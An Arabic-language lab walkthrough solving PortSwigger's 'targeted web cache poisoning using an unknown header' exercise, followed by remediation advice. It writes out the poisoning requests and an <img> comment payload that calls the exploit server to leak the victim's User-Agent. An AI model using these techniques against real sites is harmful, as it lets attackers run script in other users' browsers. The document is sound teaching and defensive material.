# [Targeted web cache poisoning using an unknown header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header)

## **`الهدف`**
قم بتسميم ذاكرة التخزين المؤقت باستجابة تقوم بتنفيذ `alert(document.cookie)` في متصفح الضحية، ولكن يجب عليك التأكد من أن الرد يتم تقديمه إلى مجموعة فرعية محددة من المستخدمين الذين ينتمي إليهم الضحية المقصودة.
## **`خطوات الحل`**
سنقوم بتحويل طلب الدخول إلى اللاب إلى `Repeater` 
```http
GET / HTTP/1.1
Host: 0ace0047043586e380e82bba000800f7.h1-web-security-academy.net
Cookie: session=A7GdcL9Xz7RjYnCwp3dwf8qLFfOsB2z2
```
بعد ذلك سنستعمل إضافة `Param Miner` لنكتشف أن اللاب يدعم ترويسة `x-host:` ويعكسها في الاستجابة
وعندما نجربها فى طلب كالتالي:
```http
GET / HTTP/1.1
Host: 0ace0047043586e380e82bba000800f7.h1-web-security-academy.net
x-host: TESTEST
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
```
سنجد الاستجابة كالتالي:
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=f5fyD5wVLxcJuKeS2RVoo7JVtri8rgAp; Secure; HttpOnly; SameSite=None
Vary: User-Agent
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Connection: close
Content-Length: 8880

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <title>Targeted web cache poisoning using an unknown header</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script type="text/javascript" src="//TESTEST/resources/js/tracking.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Targeted web cache poisoning using an unknown header</h2>
                            <a class=link-back href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aTargeted+web+cache+poisoning+using+an+unknown+header%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-design-flaws%2flab-web-cache-poisoning-targeted-using-an-unknown-header&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-design-flaws%2flab-web-cache-poisoning-targeted-using-an-unknown-header'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="blog-header">
                        <img src="/resources/images/blog.svg">
                    </section>
                    <section class="blog-list">
                        <div class="blog-post">
                        <a href="/post?postId=3"><img src="/image/blog/posts/53.jpg"></a>
                        <h2>No More Burping Out Loud Guys</h2>
                        <p>One young woman fed up with her workmates burping out loud in the office took matters into her own hands.</p>
                        <a class="button is-small" href="/post?postId=3">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=2"><img src="/image/blog/posts/2.jpg"></a>
                        <h2>21st Century Dreaming</h2>
                        <p>Despite the number of differences in lifestyle between us humans, we can all have dreams with similar themes. I have very vivid dreams which appear like full-length movies. I have noticed changes as society and technology evolves.</p>
                        <a class="button is-small" href="/post?postId=2">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=5"><img src="/image/blog/posts/30.jpg"></a>
                        <h2>Benefits of Travelling</h2>
                        <p>Travelling is such an emotive word. It can excite some, scare others and conjure images of grubby millennials backpacking around the far reaches of the earth for a few. It is however, a word that can mean whatever it is...</p>
                        <a class="button is-small" href="/post?postId=5">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=1"><img src="/image/blog/posts/43.jpg"></a>
                        <h2>New Year - New Friends</h2>
                        <p>It's always the same. A new year begins and those people you thought were your friends go, well, a bit weird. Your nearest and dearest, between them, have a very long list of things they want to change about themselves....</p>
                        <a class="button is-small" href="/post?postId=1">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=4"><img src="/image/blog/posts/51.jpg"></a>
                        <h2>Favours</h2>
                        <p>Favours are a tricky thing. Some people seem to ask for them all the time, some people hardly ever do and some people outright refuse to ever ask for one as they don't want to end up owing someone.</p>
                        <a class="button is-small" href="/post?postId=4">View post</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```
وسنلاحظ أنه ينعكس كـ `absolute URL` يستخدم لاستيراد سكريبت.

لذلك سنقوم بالدخول إلى سيرفر الاستغلال الموجود في اللاب، ونقوم بتعديل حقل `File` إلى `/resources/js/tracking.js` ونقوم بحقن `alert(document.cookie)` في حقل `Body` ونضغط `Store`

ثم نقوم بنسخ رابط سيرفر الاستغلال ونقوم بحقنه فى معلم `X-Forwarded-Host:` الثاني في الطلب الأصلى للصفحة الرئيسية
```http
GET / HTTP/1.1
Host: 0ace0047043586e380e82bba000800f7.h1-web-security-academy.net
x-host: exploit-0a5300fd044886dd80432a22014d00db.exploit-server.net
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
```

وقد نحتاج لتكرار إرسال الطلب أكثر من مرة حتى يتم تجديد الـ `Cache` وبعد ذلك نعود إلى اللاب ونضغط `Home` سنجد أن الـ `POP UP` قد ظهرت.

بعد ذلك سنقوم بالدخول على أى تدوينة ثم نقوم بحقن الأمر التالي فى خانة `Comment` ونملأ باقي الحقول بأى بيانات عشوائية ثم نضغط `Post Comment`
```html
<img src="https://exploit-0a5300fd044886dd80432a22014d00db.exploit-server.net/test" /
```

بعد ذلك سنتوجه إلى سيرفر الاستغلال مرة أخرى ونتوجه إلى `Access log` لنلاحظ وجود السطر التالي
```
10.0.4.134      2026-09-20 16:57:07 +0000 "GET / HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
```

لذلك سنقوم بنسخ الـ `user_agent` ونعود إلى الطلب الأصلي ونضعه فيه
```http
GET / HTTP/1.1
Host: 0ace0047043586e380e82bba000800f7.h1-web-security-academy.net
x-host: exploit-0a5300fd044886dd80432a22014d00db.exploit-server.net
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
```
وقد نحتاج لتكرار إرسال الطلب أكثر من مرة حتى يتم تجديد الـ `Cache` وبعد ذلك نعود إلى اللاب ونضغط `Home` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
إذا لم تكن البنية التحتية للموقع تستخدم `Reverse Proxy` أو` Load Balancer` يتطلب استخدام ترويسة `X-host` لعمله الداخلي، فيجب إعداد الـ `Middleware` أو سيرفر الويب (مثل `Nginx` أو `Apache`) ليتجاهل أو يحذف هذه الترويسة تماماً من أي `Request` قادم قبل أن يصل إلى الواجهة الخلفية `back-end.`

ويجب ألا يعتمد التطبيق نهائياً على أي `HTTP Headers` (مثل `Host` أو `X-Host`) القادمة من المستخدم (لأنها `User Input` يمكن التلاعب به)، وبدلاً من ذلك، يجب الاعتماد على متغير ثابت داخل ملفات إعدادات التطبيق أو متغيرات البيئة` Environment Variables`.

ويجب استخدام مسارات نسبية `Relative Paths` لاستدعاء سكريبتات موجودة على نفس السيرفر، فيجب تعديل الكود ليكون:
```html
<script 
	src="/resources/js/tracking.js">
</script>
```

ويجب تحويل أي رموز خاصة `Special Characters` مدخلة من قبل المستخدم إلى ما يقابلها في `HTML Entities` قبل عرضها في صفحة التعليقات إذا كان الموقع يسمح بكتابة نصوص عادية فقط `Plain Text`.

وإذا كان الموقع يسمح بتنسيق النصوص مثل `Rich Text/HTML comments` فيجب استخدام مكتبة تنقيح موثوقة لتنظيف المدخلات بالاعتماد على قائمة بيضاء `Whitelist` وإزالة أي وسم `Tag` خبيث أو غير مصرح به قبل حفظه في قاعدة البيانات.

ويجب على المطور الاعتماد على محركات قوالب `Template Engines` حديثة تدعم الترميز التلقائي `Auto-escaping`، فحتى لو نسي المطور معالجة بعض المدخلات يدوياً، سيتدخل إطار العمل `Framework` ويشفر البيانات ويمنع تفعيل وسم `script` بفضل هذه الحماية المدمجة.

يجب على مسؤول النظام إعداد جدار حماية تطبيقات الويب `WAF` لفحص وتحليل جميع الطلبات الواردة، فحتى لو نسي المطورون ترقيع الثغرة برمجياً، سيتدخل الـ `WAF` ويحظر الطلب المشبوه ويمنع وصول الـ `Payload` إلى السيرفر بفضل قواعد الحماية `Rules` المحدثة.

وكطبقة حماية إضافية، يجب على السيرفر إرسال ترويسة `CSP` صارمة تمنع تنفيذ أكواد `JS` المدمجة `Inline Scripts` فحتى لو فشل السيرفر في فلترة البيانات، سيتدخل المتصفح ويمنع تنفيذ الـ `alert()` بفضل هذه السياسة.

ويجب تفعيل خاصية `HttpOnly` لملفات تعريف الارتباط الخاصة بالجلسة `Session Cookies`، وعلى الرغم أن هذا الإجراء لن يمنع ثغرة الـ `XSS` من الحدوث، ولكنه سيمنع كود الجافاسكريبت الخبيث من الوصول إلى الجلسة عبر `document.cookie`، مما يفشل محاولات اختراق الحساب `Account Takeover`.
